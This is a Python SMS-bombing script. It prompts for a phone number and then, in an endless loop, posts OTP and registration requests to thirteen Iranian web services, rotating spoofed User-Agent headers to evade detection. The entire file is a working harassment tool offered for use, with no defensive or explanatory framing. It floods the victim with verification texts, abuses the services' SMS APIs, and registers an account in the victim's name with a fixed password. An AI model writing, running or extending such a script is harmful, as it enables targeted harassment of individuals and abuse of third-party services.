import requests
import time
import random


print('  🦉🦉🦉🦉	 " Created By Snowy Owl "    🦉🦉🦉🦉   \n ')
number = input('  enter number Without zero (like 9123456789) : \n >>>> \t ')


divar_url = 'https://api.divar.ir/v5/auth/authenticate'
divar_json = {"phone" :'0'+ number}

snap_url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
snap_json = {"cellphone": "+98"+ number}

bargh_url = 'https://uiapi2.saapa.ir/api/otp/sendCode'
bargh_json = {'mobile': '0'+number}

pinket_url = 'https://pinket.com/api/cu/v2/phone-verification'
pinket_json = {'phoneNumber': '0'+number}

oteacher_url = 'https://api.oteacher.org/v1/otp'
oteacher_json = {'phone': '0'+number}

baslam_url = 'https://auth.basalam.com/otp-request'
baslam_json = {'mobile':'0'+number}

snptrp_url = 'https://www.snapptrip.com/register'
snptrp_json ={'mobile_phone':'0'+number,'password':"123456",'lang':"fa",'country_id':"860",'country_code':"+98"}

dijijet_url = 'https://api.digikalajet.ir/user/login-register/'
dijijet_json = {'phone':'0'+number}

itoll_url = 'https://app.itoll.ir/api/v1/auth/login'
itoll_json = {'mobile':'0'+number}


kukala_url='https://api.kukala.ir/api/user/Otp'
kukala_json={'phoneNumber':'0'+number}


jabama_url = 'https://taraazws.jabama.com/api/v4/account/send-code'
jabama_json = {'mobile':'0'+number}

vandar_url = 'https://api.vandar.io/account/v1/check/mobile'
vandar_json = {'mobile':'0'+number}


ostad_url = 'https://api.ostadkr.com/login'
ostad_json = {'mobile': '0'+number}

heads = [
	{
		'User-Agent':"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
		'Accept' : '*/*'
	},

		{
		'User-Agent':"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		'Accept': '*/*'
		},

	{
		'User-Agent':"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
		'Accept' : '*/*'
	},

		{
		'User-Agent':"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		'Accept' : '*/*'
		},

	{
		'User-Agent':"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
		'Accept' : '*/*'
	},

		{
		'User-Agent':"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		'Accept' : '*/*'
		},

	{
		'User-Agent':"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		'Accept' : '*/*'
	},	

		{
		'User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
		'Accept' : '*/*'
		},	
  
	{
		'User-Agent': "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0",
		'Accept' : '*/*'
	},

		{
		'User-Agent': "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
		'Accept' : '*/*'
  		},
  
	{
		'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
		'Accept' : '*/*'
  	},
 
		{
		'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5",
		'Accept' : '*/*'
  		},
	{
		'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
		'Accept' : '*/*'
  	},
 
		{
		'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		'Accept' : '*/*'  	
    	},
  
	{
		'User-Agent': "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
		'Accept' : '*/*'
    },
 
		{
		'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		'Accept' : '*/*'
    	},
  
	{
		'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
		'Accept' : '*/*',
    },
 
		{
		'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0",
  		'Accept' : '*/*'
  		},
]


while True:

	#divar
	random_header = random.choice(heads)
	req = requests.post(url=divar_url,json = divar_json,headers=random_header)
	time.sleep(10)
	print(req)

	#snap
	random_header = random.choice(heads)
	req = requests.post(url=snap_url,json = snap_json,headers=random_header)
	time.sleep(10)
	print(req)
 

	#bargh
	random_header = random.choice(heads)
	req = requests.post(url=bargh_url,json = bargh_json,headers=random_header)
	time.sleep(320)
	print(req)


	#pinket
	random_header = random.choice(heads)
	req = requests.post(url=pinket_url,json = pinket_json,headers=random_header)
	time.sleep(130)
	print(req)

 
	#oteacher
	random_header = random.choice(heads)
	req = requests.post(url=oteacher_url ,json = oteacher_json, headers=random_header)
	time.sleep(300)
	print(req)

   #baslam
	random_header = random.choice(heads)
	req = requests.post(url= baslam_url,json = bargh_json , headers=random_header)
	time.sleep(70)
	print(req)

    #snptrp
	random_header = random.choice(heads)
	req = requests.post(url= snptrp_url,json = snptrp_json , headers=random_header)
	time.sleep(70)
	print(req)

	#dijijet
	random_header = random.choice(heads)
	req = requests.post(url= dijijet_url,json = dijijet_json , headers=random_header)
	time.sleep(130)
	print(req)

    
    #itoll
	random_header = random.choice(heads)
	req = requests.post(url= itoll_url,json = itoll_json , headers=random_header)
	time.sleep(70)
	print(req)

    #kukala
	random_header = random.choice(heads)
	req = requests.post(url= kukala_url,json = kukala_json  , headers=random_header)
	time.sleep(130)
	print(req)

	#jabama
	random_header = random.choice(heads)
	req = requests.post(url= jabama_url,json = jabama_json , headers=random_header)
	time.sleep(130)
	print(req)

	#vandar
	random_header = random.choice(heads)
	req = requests.post(url= vandar_url,json = vandar_json, headers=random_header)
	time.sleep(130)
	print(req)
 
    #ostad
	random_header = random.choice(heads)
	req = requests.post(url= ostad_url, json = ostad_json, headers=random_header)
	time.sleep(130)
	print(req)

